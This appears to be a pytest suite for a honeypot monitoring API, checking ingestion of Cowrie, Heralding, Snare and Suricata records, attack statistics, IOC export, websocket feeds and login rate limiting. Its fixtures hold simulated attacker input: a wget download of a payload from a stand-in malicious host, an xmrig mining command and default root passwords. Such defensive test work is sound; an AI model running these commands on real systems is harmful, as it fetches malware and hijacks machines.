"""End-to-end API tests: login, ingest, events, stats, ioc export, ws, rate limit."""

from __future__ import annotations

from typing import Any

import orjson
import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from starlette.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from app.config import Settings
from app.main import create_app
from app.ratelimit import limiter
from tests.conftest import ADMIN_PASSWORD, INGEST_KEY, apache_utc, iso_utc, make_settings

ATTACKER = "45.155.204.1"
CREDENTIAL_SOURCE = "91.219.236.10"
SCANNER = "185.220.101.55"
PROBER = "45.83.91.1"
MALWARE_HOST = "45.146.164.110"

COWRIE_BATCH: list[dict[str, Any]] = [
    {
        "eventid": "cowrie.session.connect",
        "session": "abc123",
        "timestamp": iso_utc(600),
        "src_ip": ATTACKER,
    },
    {
        "eventid": "cowrie.login.failed",
        "session": "abc123",
        "timestamp": iso_utc(599),
        "src_ip": ATTACKER,
        "username": "root",
        "password": "xc3511",
    },
    {
        "eventid": "cowrie.command.input",
        "session": "abc123",
        "timestamp": iso_utc(598),
        "src_ip": ATTACKER,
        "input": f"cd /tmp; wget http://evil.example.com/x86; nslookup evil.example.com",
    },
    {
        "eventid": "cowrie.session.file_download",
        "session": "abc123",
        "timestamp": iso_utc(597),
        "src_ip": ATTACKER,
        "url": "http://evil.example.com/x86",
    },
    {
        "eventid": "cowrie.session.closed",
        "session": "abc123",
        "timestamp": iso_utc(596),
        "src_ip": ATTACKER,
    },
]

HERALDING_BATCH = [
    {
        "log": (
            f"{iso_utc(590)},auth-1,sess-h1,{CREDENTIAL_SOURCE},4444,10.0.0.5,22,ssh,root,toor,"
        )
    }
]
SNARE_BATCH = [
    {
        "log": (
            f'{SCANNER} - - [{apache_utc(585)}] "GET /wp-login.php HTTP/1.1" '
            f'404 512 "-" "sqlmap/1.7.2"'
        )
    }
]
SURICATA_BATCH = [
    {
        "timestamp": iso_utc(580),
        "event_type": "alert",
        "src_ip": PROBER,
        "dest_port": 445,
        "flow_id": 99123,
        "alert": {"signature": "ET SCAN Nmap OS Detection Probe", "severity_id": 2},
    }
]
SNARE_MALFORMED = [{"log": "<<<definitely not a log line>>>"}]

EVENT_KEYS = {
    "id", "timestamp", "source_ip", "country", "city", "asn", "lat", "lon",
    "honeypot", "service", "attack_type", "username", "password", "payload",
    "severity", "session_id", "event_kind", "sha256", "size_bytes",
}


def auth_header(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


async def login_and_ingest(app: FastAPI, client: AsyncClient) -> str:
    """Log in, ingest all batches, flush the pipeline; returns the bearer token."""
    login = await client.post("/api/v1/auth/login", json={"username": "admin", "password": ADMIN_PASSWORD})
    assert login.status_code == 200, login.text
    token = login.json()["access_token"]
    key = {"X-API-Key": INGEST_KEY}
    expected = [
        ("cowrie", COWRIE_BATCH, 5, 0),
        ("heralding", HERALDING_BATCH, 1, 0),
        ("snare", SNARE_BATCH, 1, 0),
        ("suricata", SURICATA_BATCH, 1, 0),
        ("snare", SNARE_MALFORMED, 0, 1),
    ]
    for source, batch, accepted, rejected in expected:
        response = await client.post(f"/api/v1/ingest/{source}", json=batch, headers=key)
        assert response.status_code == 202, response.text
        assert response.json() == {"accepted": accepted, "rejected": rejected}
    await app.state.pipeline.flush()
    return token


async def test_full_flow(app_client: tuple[FastAPI, AsyncClient]) -> None:
    app, client = app_client

    health = await client.get("/api/v1/health")
    assert health.status_code == 200
    assert health.json() == {"status": "ok"}

    unauthorized = await client.get("/api/v1/events")
    assert unauthorized.status_code == 401

    bad_login = await client.post("/api/v1/auth/login", json={"username": "admin", "password": "nope"})
    assert bad_login.status_code == 401

    no_key = await client.post("/api/v1/ingest/cowrie", json=COWRIE_BATCH)
    assert no_key.status_code == 401
    wrong_key = await client.post("/api/v1/ingest/cowrie", json=COWRIE_BATCH, headers={"X-API-Key": "wrong"})
    assert wrong_key.status_code == 401

    unknown_source = await client.post(
        "/api/v1/ingest/unknown", json=[{"log": "x"}], headers={"X-API-Key": INGEST_KEY}
    )
    assert unknown_source.status_code == 404

    oversized = await client.post(
        "/api/v1/ingest/cowrie",
        json=[{"eventid": "cowrie.session.closed", "session": "s"}] * 5001,
        headers={"X-API-Key": INGEST_KEY},
    )
    assert oversized.status_code == 413

    token = await login_and_ingest(app, client)
    headers = auth_header(token)

    me = await client.get("/api/v1/auth/me", headers=headers)
    assert me.status_code == 200
    assert me.json() == {"username": "admin"}

    events = await client.get("/api/v1/events?limit=50", headers=headers)
    assert events.status_code == 200
    body = events.json()
    assert body["total"] == 8
    assert len(body["items"]) == 8
    assert set(body["items"][0].keys()) == EVENT_KEYS
    timestamps = [item["timestamp"] for item in body["items"]]
    assert timestamps == sorted(timestamps, reverse=True)

    filtered = await client.get(
        "/api/v1/events", headers=headers, params={"attack_type": "Mirai", "limit": 10}
    )
    assert filtered.status_code == 200
    assert filtered.json()["total"] == 1
    assert filtered.json()["items"][0]["honeypot"] == "cowrie"

    by_ip = await client.get("/api/v1/events", headers=headers, params={"ip": ATTACKER})
    assert by_ip.json()["total"] == 5

    by_severity = await client.get("/api/v1/events", headers=headers, params={"severity": "high"})
    assert by_severity.json()["total"] == 3  # Mirai + 2x Malware Download

    overview = await client.get("/api/v1/stats/overview", headers=headers)
    assert overview.status_code == 200
    assert set(overview.json().keys()) == {
        "total_attacks", "unique_attackers", "countries",
        "credentials_captured", "commands_executed", "last_24h",
    }
    stats = overview.json()
    assert stats["total_attacks"] == 8
    assert stats["unique_attackers"] == 4
    assert stats["credentials_captured"] == 4  # cowrie root/xc3511 + command/file_download inheriting root + heralding root/toor
    assert stats["commands_executed"] == 2
    assert stats["last_24h"] == 8

    timeseries = await client.get(
        "/api/v1/stats/timeseries", headers=headers, params={"days": 7, "interval": "hour"}
    )
    assert timeseries.status_code == 200
    ts_body = timeseries.json()
    assert ts_body["interval"] == "hour"
    assert sum(point["total"] for point in ts_body["points"]) == 8
    assert set(ts_body["by_type"][0].keys()) == {"attack_type", "count"}

    ssh = await client.get("/api/v1/ssh/stats", headers=headers, params={"days": 30})
    assert ssh.status_code == 200
    ssh_body = ssh.json()
    assert set(ssh_body.keys()) == {
        "sessions", "brute_force_events", "credentials", "commands", "top_usernames",
        "top_passwords", "top_commands", "malware_downloads", "top_sources", "event_kinds",
    }
    assert set(ssh_body["event_kinds"][0].keys()) == {"name", "count"}
    assert {facet["name"] for facet in ssh_body["event_kinds"]} >= {
        "connect", "failed_password", "command", "file_download",
    }
    assert ssh_body["sessions"] == 1
    assert ssh_body["brute_force_events"] == 0
    assert ssh_body["credentials"] >= 1
    assert ssh_body["commands"] >= 1
    assert ssh_body["top_usernames"][0]["name"] == "root"
    assert len(ssh_body["malware_downloads"]) == 2
    assert len(ssh_body["top_sources"]) >= 1
    assert {r["name"] for r in ssh_body["top_sources"]} <= {
        e["source_ip"] for e in body["items"]
    }

    web = await client.get("/api/v1/web/stats", headers=headers, params={"days": 30})
    assert web.status_code == 200
    web_body = web.json()
    assert set(web_body.keys()) == {
        "scanner_events", "top_urls", "top_user_agents", "exploit_payloads", "attack_types",
    }
    assert web_body["scanner_events"] == 1
    assert web_body["top_user_agents"][0]["name"] == "sqlmap/1.7.2"
    assert web_body["top_urls"][0]["name"] == "/wp-login.php"

    credentials = await client.get("/api/v1/credentials/stats", headers=headers, params={"days": 30})
    assert credentials.status_code == 200
    cred_body = credentials.json()
    assert set(cred_body.keys()) == {
        "unique_pairs", "by_service", "top_usernames", "top_passwords", "reuse_pairs",
    }
    assert cred_body["unique_pairs"] == 2  # root/xc3511 + root/toor
    assert cred_body["by_service"][0]["name"] == "ssh"
    assert cred_body["reuse_pairs"] == []

    network = await client.get("/api/v1/network/stats", headers=headers, params={"days": 30})
    assert network.status_code == 200
    net_body = network.json()
    assert set(net_body.keys()) == {"total_alerts", "signatures", "protocols", "top_sources"}
    assert net_body["total_alerts"] == 1
    assert net_body["signatures"][0]["name"] == "ET SCAN Nmap OS Detection Probe"
    assert net_body["top_sources"][0]["name"] == PROBER

    map_points = await client.get("/api/v1/map/points", headers=headers, params={"days": 7})
    assert map_points.status_code == 200
    map_body = map_points.json()
    assert set(map_body.keys()) == {"points", "top_countries"}
    assert map_body["points"] == []  # geoip disabled in tests

    iocs = await client.get("/api/v1/ioc", headers=headers, params={"days": 7})
    assert iocs.status_code == 200
    ioc_body = iocs.json()
    assert set(ioc_body.keys()) == {"ips", "urls", "domains", "hashes"}
    assert set(ip["value"] for ip in ioc_body["ips"]) == {
        ATTACKER, CREDENTIAL_SOURCE, SCANNER, PROBER
    }
    top_ip = ioc_body["ips"][0]
    assert set(top_ip.keys()) == {"value", "country", "asn", "hits", "last_seen"}
    assert top_ip["value"] == ATTACKER
    assert top_ip["hits"] == 5
    assert ioc_body["urls"] == [{"value": "http://evil.example.com/x86", "hits": 2}]
    assert ioc_body["domains"] == [{"value": "evil.example.com", "hits": 1}]
    assert ioc_body["hashes"] == []

    export_csv_response = await client.get(
        "/api/v1/ioc/export", headers=headers, params={"format": "csv", "types": "ip,url"}
    )
    assert export_csv_response.status_code == 200
    assert "text/csv" in export_csv_response.headers["content-type"]
    disposition = export_csv_response.headers["content-disposition"]
    assert disposition.startswith("attachment; filename=\"ioc_")
    assert disposition.endswith(".csv\"")
    csv_text = export_csv_response.text
    assert csv_text.splitlines()[0] == "type,value,country,asn,hits,last_seen"
    assert "http://evil.example.com/x86" in csv_text
    assert ATTACKER in csv_text

    export_json_response = await client.get(
        "/api/v1/ioc/export", headers=headers, params={"format": "json", "types": "url"}
    )
    assert export_json_response.status_code == 200
    assert "application/json" in export_json_response.headers["content-type"]
    json_payload = orjson.loads(export_json_response.content)
    assert set(json_payload.keys()) == {"urls"}
    assert json_payload["urls"][0]["value"] == "http://evil.example.com/x86"

    ready = await client.get("/api/v1/health/ready")
    assert ready.status_code == 200
    ready_body = ready.json()
    assert set(ready_body.keys()) == {"status", "database", "geoip", "queue_depth", "uptime_seconds"}
    assert ready_body["uptime_seconds"] >= 0
    assert {k: v for k, v in ready_body.items() if k != "uptime_seconds"} == {
        "status": "ok",
        "database": "ok",
        "geoip": "disabled",
        "queue_depth": 0,
    }
    assert ready.headers.get("x-request-id")


async def test_login_rate_limited(app_client: tuple[FastAPI, AsyncClient]) -> None:
    _, client = app_client
    codes = []
    for _ in range(6):
        response = await client.post("/api/v1/auth/login", json={"username": "admin", "password": "bad"})
        codes.append(response.status_code)
    assert 401 in codes
    assert codes[-1] == 429


def test_ws_live(tmp_path: Any) -> None:
    limiter.reset()
    app = create_app(make_settings(tmp_path))
    with TestClient(app) as client:
        with pytest.raises(WebSocketDisconnect) as excinfo:
            with client.websocket_connect("/api/v1/ws/live?token=not-a-jwt") as websocket:
                websocket.receive_text()
        assert excinfo.value.code == 4401

        login = client.post("/api/v1/auth/login", json={"username": "admin", "password": ADMIN_PASSWORD})
        token = login.json()["access_token"]
        with client.websocket_connect(f"/api/v1/ws/live?token={token}") as websocket:
            ingest = client.post(
                "/api/v1/ingest/cowrie",
                json=[{
                    "eventid": "cowrie.session.connect",
                    "session": "ws1",
                    "timestamp": iso_utc(1),
                    "src_ip": ATTACKER,
                }],
                headers={"X-API-Key": INGEST_KEY},
            )
            assert ingest.status_code == 202
            frame = orjson.loads(websocket.receive_text())
            assert frame["honeypot"] == "cowrie"
            assert frame["session_id"] == "ws1"
            assert frame["attack_type"] == "Generic Bot Activity"
            websocket.send_text(orjson.dumps({"type": "ping"}).decode("utf-8"))
            pong = orjson.loads(websocket.receive_text())
            assert pong == {"type": "pong"}


async def _login_ingest(app: FastAPI, client: AsyncClient, batches: list[tuple[str, list[dict[str, Any]]]]) -> str:
    """Log in, ingest the given (source, records) batches, flush; returns the token."""
    login = await client.post("/api/v1/auth/login", json={"username": "admin", "password": ADMIN_PASSWORD})
    assert login.status_code == 200, login.text
    token = login.json()["access_token"]
    key = {"X-API-Key": INGEST_KEY}
    for source, batch in batches:
        response = await client.post(f"/api/v1/ingest/{source}", json=batch, headers=key)
        assert response.status_code == 202, response.text
        assert response.json()["rejected"] == 0, response.json()
    await app.state.pipeline.flush()
    return token


def _now_record(eventid: str, session: str, src_ip: str, **extra: Any) -> dict[str, Any]:
    record: dict[str, Any] = {
        "eventid": eventid,
        "session": session,
        "timestamp": iso_utc(1),
        "src_ip": src_ip,
    }
    record.update(extra)
    return record


async def test_heatmap(app_client: tuple[FastAPI, AsyncClient]) -> None:
    app, client = app_client
    token = await _login_ingest(app, client, [(
        "cowrie",
        [
            _now_record("cowrie.session.connect", "hm1", ATTACKER),
            _now_record("cowrie.login.failed", "hm1", ATTACKER, username="root", password="123456"),
            _now_record("cowrie.command.input", "hm1", ATTACKER, input="uname -a"),
            _now_record(
                "cowrie.session.file_download", "hm1", ATTACKER,
                url="http://evil.example.com/x86", shasum="sha256:" + "ab" * 32, filesize=2048,
            ),
            _now_record("cowrie.client.version", "hm1", ATTACKER, version=["SSH-2.0-Go"]),
        ],
    )])
    response = await client.get("/api/v1/ssh/heatmap", headers=auth_header(token), params={"hours": 24})
    assert response.status_code == 200, response.text
    body = response.json()
    assert set(body.keys()) == {"hours", "kinds", "matrix"}
    assert len(body["hours"]) == 24
    kinds = set(body["kinds"])
    assert {"connect", "failed_password", "command", "file_download", "client_version"} <= kinds
    assert len(body["matrix"]) == len(body["kinds"])
    assert all(len(row) == 24 for row in body["matrix"])
    # Current hour is the last bucket (ascending); every ingested kind is live there.
    current = -1
    for kind, row in zip(body["kinds"], body["matrix"]):
        if kind in {"connect", "failed_password", "command", "file_download", "client_version"}:
            assert row[current] >= 1, (kind, row)


async def test_actors(app_client: tuple[FastAPI, AsyncClient]) -> None:
    app, client = app_client
    crypto_ip = "45.155.204.1"
    spray_ip = "185.220.101.55"
    batches: list[tuple[str, list[dict[str, Any]]]] = [(
        "cowrie",
        [
            # crypto actor: got in, ran a miner fetch -> crypto_target / deploy.
            _now_record("cowrie.session.connect", "ac1", crypto_ip),
            _now_record("cowrie.login.success", "ac1", crypto_ip, username="root", password="toor"),
            _now_record("cowrie.command.input", "ac1", crypto_ip, input="cd /tmp"),
            _now_record("cowrie.command.input", "ac1", crypto_ip, input="xmrig -o pool.minexmr.com:4444"),
        ],
    ), (
        "cowrie",
        [
            # handshake-only actor: 1 connect + 2 failed logins -> handshake_scan / probe.
            _now_record("cowrie.session.connect", "ac2", spray_ip),
            _now_record("cowrie.login.failed", "ac2", spray_ip, username="admin", password="admin"),
            _now_record("cowrie.login.failed", "ac2", spray_ip, username="admin", password="admin"),
        ],
    )]
    token = await _login_ingest(app, client, batches)
    headers = auth_header(token)
    response = await client.get("/api/v1/ssh/actors", headers=headers, params={"days": 30})
    assert response.status_code == 200, response.text
    body = response.json()
    assert set(body.keys()) == {"actors", "playbooks", "intents", "event_kinds", "sources", "geography"}
    rows = {row["ip"]: row for row in body["actors"]}
    assert crypto_ip in rows and spray_ip in rows
    assert rows[crypto_ip]["playbook"] == "crypto_target"
    assert rows[crypto_ip]["intent"] == "deploy"
    assert rows[spray_ip]["playbook"] == "handshake_scan"
    assert rows[spray_ip]["intent"] == "probe"
    playbooks = {facet["name"] for facet in body["playbooks"]}
    assert {"crypto_target", "handshake_scan"} <= playbooks
    intents = {facet["name"] for facet in body["intents"]}
    assert {"deploy", "probe"} <= intents
    assert body["event_kinds"]
    assert {facet["name"] for facet in body["sources"]} >= {"cowrie"}


async def test_payloads(app_client: tuple[FastAPI, AsyncClient]) -> None:
    app, client = app_client
    sha = "cd" * 32
    token = await _login_ingest(app, client, [(
        "cowrie",
        [
            _now_record("cowrie.login.success", "pl1", ATTACKER, username="root", password="toor"),
            _now_record(
                "cowrie.session.file_download", "pl1", ATTACKER,
                url="http://evil.example.com/x86", shasum=f"sha256:{sha}", filesize=4096,
            ),
        ],
    )])
    response = await client.get("/api/v1/ssh/payloads", headers=auth_header(token), params={"limit": 100})
    assert response.status_code == 200, response.text
    body = response.json()
    assert set(body.keys()) == {"stats", "items"}
    assert set(body["stats"].keys()) == {"tracked_urls", "saved", "fetching_now", "bytes_on_disk"}
    assert body["stats"]["saved"] >= 1
    assert body["stats"]["tracked_urls"] >= 1
    assert body["stats"]["fetching_now"] == 0
    assert body["stats"]["bytes_on_disk"] >= 4096
    assert body["items"], "expected at least one payload row"
    item = body["items"][0]
    assert set(item.keys()) == {"time", "url", "sha256", "size_bytes", "source_ip", "origin"}
    assert item["url"] == "http://evil.example.com/x86"
    assert item["sha256"] == sha
    assert item["size_bytes"] == 4096
    assert item["source_ip"] == ATTACKER
    assert item["origin"] == "cowrie file_download"
